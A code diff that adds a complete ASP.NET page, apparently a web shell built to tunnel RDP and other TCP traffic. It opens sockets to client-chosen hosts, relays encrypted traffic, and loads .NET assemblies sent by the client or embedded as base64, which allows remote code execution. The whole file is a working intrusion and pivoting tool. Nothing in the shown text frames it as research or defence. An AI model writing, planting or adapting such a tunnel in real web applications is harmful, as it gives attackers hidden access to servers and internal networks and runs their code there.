@@ -1,0 +1,472 @@
+<%@ Page Language="C#" Debug="true" ValidateRequest="false" %>
+
+<%@ Import Namespace="System" %>
+<%@ Import Namespace="System.Net" %>
+<%@ Import Namespace="System.Net.Sockets" %>
+<%@ Import Namespace="System.Text" %>
+<%@ Import Namespace="System.Reflection" %>
+<%@ Import Namespace="System.IO" %>
+<script runat="server">
+    const int PacketSize = 1024 * 8;
+    const string SessionKey = "SessionSocket";
+    const string DllKey = "EncryptionDll";
+    const string Version = "1.5";
+    void CloseAppSockets()
+    {
+        if (Application != null && Application.Count > 0)
+        {
+            for (int i = 0; i < Application.Count; i++)
+            {
+                if (Application[i].GetType() != typeof(Socket)) continue;
+                Socket sc = Application[i] as Socket;
+                if (!sc.Connected) CloseSocket(sc);
+                Application.RemoveAt(i);
+            }
+        }
+    }
+    void CloseSocket(Socket s)
+    {
+        if (s == null)
+            return;
+        try
+        {
+            s.Shutdown(SocketShutdown.Both);
+        }
+        catch { }
+        try
+        {
+            s.Close();
+        }
+        catch { }
+
+    }
+    object GetParam(string id)
+    {
+        object apid = Application[id];
+        if (apid != null) return apid;
+        try
+        {
+            object ssid = Session[id];
+            if (ssid != null) return ssid;
+        }
+        catch
+        {
+
+        }
+        return null;
+    }
+    void RemoveParam(string id)
+    {
+        try
+        {
+            object apid = Application[id];
+            if (apid != null) Application.Remove(id);
+            object ssid = Session[id];
+            if (ssid != null) Session.Remove(id);
+        }
+        catch
+        {
+        }
+    }
+    protected void Page_Load(object s, EventArgs e)
+    {
+        try
+        {
+            EncryptionModule EncryptionDll = GetParam("EncryptionDll") as EncryptionModule;
+            EncryptionDll = (EncryptionDll == null ? new EncryptionModule(
+             @"TVqQAAMAAAAEAAAA//8AALgAAAAAAAAAQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAgAAAAA4fug4AtAnNIbgBTM0hVGhpcyBwcm9ncmFtIGNhbm5vdCBiZSBydW4gaW4gRE9TIG1vZGUuDQ0KJAAAAAAAAABQRQAATAEDALkNqpEAAAAAAAAAAOAAIiALATAAAAgAAAAGAAAAAAAA9iYAAAAgAAAAQAAAAAAAEAAgAAAAAgAABAAAAAAAAAAEAAAAAAAAAACAAAAAAgAAAAAAAAMAQIUAABAAABAAAAAAEAAAEAAAAAAAABAAAAAAAAAAAAAAAKQmAABPAAAAAEAAAGgDAAAAAAAAAAAAAAAAAAAAAAAAAGAAAAwAAACIJgAAHAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAIAAACAAAAAAAAAAAAAAACCAAAEgAAAAAAAAAAAAAAC50ZXh0AAAA/AYAAAAgAAAACAAAAAIAAAAAAAAAAAAAAAAAACAAAGAucnNyYwAAAGgDAAAAQAAAAAQAAAAKAAAAAAAAAAAAAAAAAABAAABALnJlbG9jAAAMAAAAAGAAAAACAAAADgAAAAAAAAAAAAAAAAAAQAAAQgAAAAAAAAAAAAAAAAAAAADYJgAAAAAAAEgAAAACAAUAiCAAAAAGAAABAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAEZ+AQAABAIoDgAACm8PAAAKKkZ+AQAABAJvEAAACigRAAAKKh4CKBIAAAoqLigTAAAKgAEAAAQqQlNKQgEAAQAAAAAADAAAAHYyLjAuNTA3MjcAAAAABQBsAAAAEAIAACN+AAB8AgAAjAIAACNTdHJpbmdzAAAAAAgFAAAEAAAAI1VTAAwFAAAQAAAAI0dVSUQAAAAcBQAA5AAAACNCbG9iAAAAAAAAAAIAAAFXFQAACQAAAAD6ATMAFgAAAQAAABEAAAACAAAAAQAAAAQAAAAEAAAAEwAAAA0AAAABAAAAAQAAAAAArgEBAAAAAAAGAPAAJAIGAF0BJAIGAD0A8gEPAEQCAAAGAGUAwAEGANMAwAEGALQAwAEGAEQBwAEGABABwAEGACkBwAEGAHwAwAEGAFEABQIGAC8ABQIGAJcAwAEGAFwCuQEGAHsBewIGAHMCuQEAAAAAGAAAAAAAAQABAAEAEAABANIBPQABAAEAEQDdAUAAUCAAAAAAlgBrAkQAAQBiIAAAAACWAGMCRAADAHQgAAAAAIYY5QEGAAUAfCAAAAAAkRjrAU0ABQAAAAEAIQAAAAIAhwIAAAEAIQAAAAIAhwIJAOUBAQARAOUBBgAZAOUBCgApAOUBEAAxAOUBEAA5AOUBEABBAOUBEABJAOUBEABRAOUBEABZAOUBEABhAOUBFQBpAOUBEABxAOUBEACJAJUBGgCBAFMCIACBAKQBJgCJAIQBLAB5AOUBBgCBAA8AMgAuAAsAUQAuABMAWgAuABsAeQAuACMAggAuACsAjgAuADMAjgAuADsAjgAuAEMAggAuAEsAlAAuAFMAjgAuAFsAjgAuAGMArAAuAGsA1gAEgAAAAQAAAAAAAAAAAAAAAAAIAAAAAgAAAAAAAAAAAAAANwAmAAAAAAAAAAAAAEJzYWU2NABCYXNlNjQAZ2V0X1VURjgAPE1vZHVsZT4AZGF0YQBtc2NvcmxpYgBHdWlkQXR0cmlidXRlAERlYnVnZ2FibGVBdHRyaWJ1dGUAQ29tVmlzaWJsZUF0dHJpYnV0ZQBBc3NlbWJseVRpdGxlQXR0cmlidXRlAEFzc2VtYmx5VHJhZGVtYXJrQXR0cmlidXRlAEFzc2VtYmx5RmlsZVZlcnNpb25BdHRyaWJ1dGUAQXNzZW1ibHlDb25maWd1cmF0aW9uQXR0cmlidXRlAEFzc2VtYmx5RGVzY3JpcHRpb25BdHRyaWJ1dGUAQ29tcGlsYXRpb25SZWxheGF0aW9uc0F0dHJpYnV0ZQBBc3NlbWJseVByb2R1Y3RBdHRyaWJ1dGUAQXNzZW1ibHlDb3B5cmlnaHRBdHRyaWJ1dGUAQXNzZW1ibHlDb21wYW55QXR0cmlidXRlAFJ1bnRpbWVDb21wYXRpYmlsaXR5QXR0cmlidXRlAEVuY29kaW5nAEZyb21CYXNlNjRTdHJpbmcAVG9CYXNlNjRTdHJpbmcAR2V0U3RyaW5nAEJhc2U2NC5kbGwAU3lzdGVtAFN5c3RlbS5SZWZsZWN0aW9uAEVuY3J5cHRpb24AZW5jb2RlcgAuY3RvcgAuY2N0b3IAU3lzdGVtLkRpYWdub3N0aWNz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AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA==",
+             "Encryption.Bsae64",
+             null) : EncryptionDll);
+            if (Request.TotalBytes > 0)
+            {
+                PackageManager Package = new PackageManager(Request.BinaryRead(Request.TotalBytes), EncryptionDll);
+                switch (Package.Type)
+                {
+                    case PackageType.Data:
+                        {
+                            DataPackage DPackage = Package.GetPackage() as DataPackage;
+                            Socket socket = GetParam(SessionKey) as Socket;
+                            if (socket != null)
+                            {
+                                lock (socket)
+                                {
+                                    if (DPackage.Data != null && DPackage.Data.Length > 0)
+                                    {
+                                        socket.Send(DPackage.Data);
+                                    }
+                                    try
+                                    {
+                                        byte[] rbuffer = new byte[PacketSize];
+                                        int bytesRead = socket.Receive(rbuffer);
+                                        if (bytesRead > 0)
+                                        {
+                                            if (bytesRead != rbuffer.Length)
+                                                Array.Resize(ref rbuffer, bytesRead);
+                                            WriteData(rbuffer, EncryptionDll);
+                                        }
+                                    }
+                                    catch (SocketException ex)
+                                    {
+                                        if (ex.SocketErrorCode != SocketError.WouldBlock)
+                                            WriteError(ex.ToString(), ErrorPlaces.OnReceive, EncryptionDll);
+                                    }
+                                    catch (Exception ex)
+                                    {
+                                        WriteError(ex.ToString(), ErrorPlaces.OnReceive, EncryptionDll);
+                                    }
+                                }
+                            }
+                            break;
+                        }
+                    case PackageType.RDPConfig:
+                        {
+                            RDPConfigPackage CPackage = Package.GetPackage() as RDPConfigPackage;
+                            if (CPackage != null)
+                            {
+                                Socket socket = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);
+                                try { socket.Connect(new IPEndPoint(IPAddress.Parse(CPackage.IP), CPackage.PORT)); }
+                                catch (Exception ex)
+                                {
+                                    if (!ex.Message.ToLower().Contains("non-blocking"))
+                                    {
+                                        WriteError(ex.ToString(), ErrorPlaces.OnConnect, EncryptionDll);
+                                        return;
+                                    }
+                                }
+                                socket.ReceiveTimeout = socket.SendTimeout = -1;
+                                socket.Blocking = CPackage.Blocking;
+                                socket.NoDelay = CPackage.Nagle;
+                                HttpContext.Current.Server.ScriptTimeout = CPackage.Timeout;
+                                if (CPackage.PlaceStore == DataStores.Application)
+                                {
+                                    Application[SessionKey] = socket;
+                                    Application[DllKey] = CPackage.EncryptionAssembly;
+                                }
+                                else
+                                {
+                                    Session[SessionKey] = socket;
+                                    Session[DllKey] = CPackage.EncryptionAssembly;
+                                }
+                                WriteOK(EncryptionDll);
+                            }
+                            else
+                            {
+                                WriteError("Invalid Config Package.", ErrorPlaces.OnConfig, EncryptionDll);
+                            }
+                            break;
+                        }
+                    case PackageType.Dispose:
+                        {
+                            DisposeProcess();
+                            break;
+                        }
+                    default: break;
+
+                }
+            }
+            else
+            {
+                if (Request.QueryString["WV-RESET"] != null)
+                {
+                    DisposeProcess();
+                    HttpContext.Current.Response.Write("OK");
+                }
+                else
+                {
+                    HttpContext.Current.Response.Write("200\n" + BitConverter.ToString(Encoding.UTF8.GetBytes(EncryptionDll.EncryptionAssembly.FullName)).Replace("-", "") + "\n" + Version + "\n");
+                }
+            }
+        }
+        catch (Exception ex) { WriteError(ex.ToString(), ErrorPlaces.GENERAL, GetParam(DllKey) as EncryptionModule); }
+    }
+    void DisposeProcess()
+    {
+        CloseSocket(GetParam(SessionKey) as Socket);
+        RemoveParam(SessionKey);
+        RemoveParam(DllKey);
+        GC.Collect();
+    }
+    void WriteOK(EncryptionModule enc)
+    {
+        WriteBytes(enc.encrypt(new byte[] { (byte)PackageType.OK }));
+    }
+    void WriteData(byte[] buffer, EncryptionModule enc)
+    {
+        WriteBytes(new DataPackage(buffer, "", enc).GetBytes());
+    }
+    void WriteError(string err, ErrorPlaces place, EncryptionModule enc)
+    {
+        WriteBytes(new ErrorPackage(err, place, enc).GetBytes());
+    }
+    void WriteBytes(byte[] buffer)
+    {
+        Response.ContentType = "application/octet-stream";
+        Response.BinaryWrite(buffer);
+    }
+    abstract class Package
+    {
+        public PackageType Type;
+        public EncryptionModule Encryptor;
+        public Encoding Encoder = Encoding.UTF8;
+        public char LF = '\n';
+        public abstract byte[] GetBytes();
+        public byte[] GetDataSection(byte[] buffer)
+        {
+            byte[] Tbuffer = new byte[buffer.Length - 1];
+            System.Buffer.BlockCopy(buffer, 1, Tbuffer, 0, Tbuffer.Length);
+            return Tbuffer;
+        }
+        public string[] ParsePackage(byte[] buffer, int[] IgnoreI)
+        {
+            string[] Nodes = null;
+            byte[] tmp = this.Encryptor.decrypt(buffer);
+            this.Type = (PackageType)tmp[0];
+            buffer = this.GetDataSection(tmp);
+            string package_txt = Encoder.GetString(buffer);
+            if (package_txt.Contains(LF.ToString()))
+            {
+                Nodes = package_txt.Split(LF);
+                if (Nodes.Length > 0)
+                {
+                    for (int i = 0; i < Nodes.Length; i++)
+                    {
+                        if (IgnoreI != null && IgnoreI.Length > 0 && IsContainsInt(IgnoreI, i))
+                        {
+                            Nodes[i] = Nodes[i];
+                        }
+                        else
+                        {
+                            try
+                            {
+                                Nodes[i] = this.Encoder.GetString(Convert.FromBase64String(Nodes[i]));
+                            }
+                            catch
+                            {
+                            }
+                        }
+                    }
+                }
+            }
+            return Nodes;
+        }
+        private bool IsContainsInt(int[] arry, int d)
+        {
+            foreach (int i in arry)
+            {
+                if (i == d) return true;
+            }
+            return false;
+        }
+        static byte[] Combine(params byte[][] arrays)
+        {
+            int array_lenght = 0;
+            foreach (byte[] buffer in arrays)
+            {
+                if (buffer == null) continue;
+                if (buffer.Length == 0) continue;
+                array_lenght += buffer.Length;
+            }
+            byte[] rv = new byte[array_lenght];
+            int offset = 0;
+            foreach (byte[] array in arrays)
+            {
+                if (array == null) continue;
+                if (array.Length == 0) continue;
+
+                System.Buffer.BlockCopy(array, 0, rv, offset, array.Length);
+                offset += array.Length;
+            }
+            return rv;
+        }
+        public byte[] CreateNodes(params object[] txt)
+        {
+            if (txt != null && txt.Length > 0)
+            {
+                string[] Nodes = new string[txt.Length];
+                for (int i = 0; i < txt.Length; i++)
+                {
+                    if (txt[i] != null && txt[i].GetType() == typeof(string))
+                    {
+                        Nodes[i] = Convert.ToBase64String(this.Encoder.GetBytes((string)txt[i]));
+                    }
+                    else
+                    {
+                        byte[] buffer = txt[i] as byte[];
+                        Nodes[i] = buffer == null ? null : Convert.ToBase64String(buffer);
+                    }
+
+                }
+                return this.Encryptor.encrypt(Combine(new byte[] { (byte)this.Type }, this.Encoder.GetBytes(string.Join(this.LF.ToString(), Nodes) + this.LF)));
+            }
+            return null;
+        }
+    }
+    class PackageManager
+    {
+        public PackageType Type;
+        private byte[] PackageBuffer;
+        private EncryptionModule Encryptor;
+        public PackageManager(byte[] buffer, EncryptionModule encryptor)
+        {
+            this.Encryptor = encryptor;
+            this.PackageBuffer = encryptor.decrypt(buffer);
+            this.Type = (PackageType)this.PackageBuffer[0];
+            this.PackageBuffer = buffer;
+        }
+        public Package GetPackage()
+        {
+            switch (this.Type)
+            {
+                case PackageType.Data:
+                    return new DataPackage(this.PackageBuffer, this.Encryptor);
+                case PackageType.Error:
+                    return new ErrorPackage(this.PackageBuffer, this.Encryptor);
+                case PackageType.RDPConfig:
+                    return new RDPConfigPackage(this.PackageBuffer, this.Encryptor);
+                default:
+                    throw new System.Exception("Invalid Package Type.");
+            }
+        }
+    }
+    class RDPConfigPackage : Package
+    {
+        public string IP;
+        public int PORT;
+        public int Timeout;
+        public bool Blocking;
+        public bool Nagle = true;
+        public DataStores PlaceStore;
+        public EncryptionModule EncryptionAssembly;
+        public RDPConfigPackage(byte[] buffer, EncryptionModule encrypter)
+        {
+            this.Encryptor = encrypter;
+            string[] Nodes = this.ParsePackage(buffer, new int[] { 5, 6 });
+            if (Nodes.Length > 0)
+            {
+                this.IP = Nodes[0];
+                this.PORT = int.Parse(Nodes[1]);
+                this.Timeout = int.Parse(Nodes[2]);
+                this.Blocking = bool.Parse(Nodes[3]);
+                this.PlaceStore = (DataStores)DataStores.Parse(typeof(DataStores), Nodes[4]);
+                this.EncryptionAssembly =
+                    new EncryptionModule(
+                        Nodes[5],
+                        Nodes[7],
+                        Convert.FromBase64String(Nodes[6])
+                    );
+                this.Nagle = bool.Parse(Nodes[8]);
+            }
+        }
+        public override byte[] GetBytes()
+        {
+            return this.CreateNodes(
+                this.IP,
+                this.PORT.ToString(),
+                this.Timeout.ToString(),
+                this.Blocking.ToString(),
+                this.PlaceStore.ToString(),
+                this.EncryptionAssembly.Buffer,
+                this.EncryptionAssembly.PrivateKey,
+                this.EncryptionAssembly.EncryptionNameSpace,
+                this.Nagle.ToString());
+        }
+    }
+    class ErrorPackage : Package
+    {
+        public string Error;
+        public ErrorPlaces Place;
+        public ErrorPackage(string err, ErrorPlaces place, EncryptionModule encrypter)
+        {
+            this.Type = PackageType.Error;
+            this.Error = err;
+            this.Place = place;
+            this.Encryptor = encrypter;
+        }
+        public ErrorPackage(byte[] buffer, EncryptionModule encrypter)
+        {
+            this.Encryptor = encrypter;
+            string[] Nodes = this.ParsePackage(buffer, null);
+            if (Nodes.Length > 0)
+            {
+                this.Error = Nodes[0];
+                this.Place = (ErrorPlaces)ErrorPlaces.Parse(typeof(ErrorPlaces), Nodes[1]);
+            }
+        }
+        public override byte[] GetBytes()
+        {
+            return this.CreateNodes(
+                this.Error,
+                this.Place.ToString());
+        }
+    }
+    class DataPackage : Package
+    {
+        public byte[] Data;
+        public DataPackage(byte[] data, string id, EncryptionModule encrypter)
+        {
+            base.Type = PackageType.Data;
+            this.Data = data;
+            this.Encryptor = encrypter;
+        }
+        public DataPackage(byte[] buffer, EncryptionModule encrypter)
+        {
+            this.Encryptor = encrypter;
+            string[] Nodes = this.ParsePackage(buffer, new int[] { 0 });
+            if (Nodes.Length > 0)
+            {
+                this.Data = Convert.FromBase64String(Nodes[0]);
+            }
+        }
+        public override byte[] GetBytes()
+        {
+            return this.CreateNodes(this.Data);
+        }
+    }
+    class EncryptionModule
+    {
+        public Assembly EncryptionAssembly;
+        public byte[] Buffer;
+        public byte[] PrivateKey;
+        public string EncryptionNameSpace;
+        public EncryptionModule(string dll_base64, string ns, byte[] key)
+        {
+            if (string.IsNullOrEmpty(dll_base64))
+                throw new Exception("Invalid Module.");
+            if (string.IsNullOrEmpty(ns))
+                throw new Exception("Invalid NameSpace.");
+            this.Buffer = Convert.FromBase64String(dll_base64);
+            this.EncryptionAssembly = Assembly.Load(this.Buffer);
+            this.EncryptionNameSpace = ns;
+            this.PrivateKey = key;
+        }
+        public byte[] encrypt(byte[] buffer)
+        {
+            return this.EncryptionAssembly.GetType(this.EncryptionNameSpace).GetMethod("encrypt").Invoke(null, new object[] { buffer, this.PrivateKey }) as byte[];
+        }
+        public byte[] decrypt(byte[] buffer)
+        {
+            return this.EncryptionAssembly.GetType(this.EncryptionNameSpace).GetMethod("decrypt").Invoke(null, new object[] { buffer, this.PrivateKey }) as byte[];
+        }
+    }
+    enum PackageType : byte
+    {
+        Data = 65,
+        Error,
+        RDPConfig,
+        OK,
+        Dispose
+    }
+    enum ErrorPlaces
+    {
+        OnSetupSocket,
+        OnConnect,
+        GENERAL,
+        OnReceive,
+        OnConfig
+    }
+    enum DataStores
+    {
+        Application,
+        Session
+    }
+</script>
